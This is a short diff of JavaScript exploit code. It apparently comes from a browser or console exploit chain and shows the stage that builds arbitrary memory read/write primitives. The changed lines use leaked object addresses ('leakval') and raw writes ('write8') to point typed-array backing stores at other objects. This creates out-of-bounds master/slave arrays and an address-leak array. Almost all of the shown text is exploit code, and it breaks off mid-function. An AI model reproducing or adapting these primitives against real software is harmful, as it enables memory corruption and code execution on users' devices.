@@ -1,9 +1,10 @@
+p = window.prim;
 var oob_master = new Uint32Array(1024);
 var oob_slave = new Uint8Array(1024);
 var leaker_arr = new Uint32Array(1024);
 var leaker_obj = {a: 1234};
-write64(addrof(oob_master).add(16), addrof(oob_slave));
-write64(addrof(leaker_arr).add(16), addrof(leaker_obj));
+p.write8(p.leakval(oob_master).add32(16), p.leakval(oob_slave));
+p.write8(p.leakval(leaker_arr).add32(16), p.leakval(leaker_obj));
 
 var i48_put = function(x, a)
 {
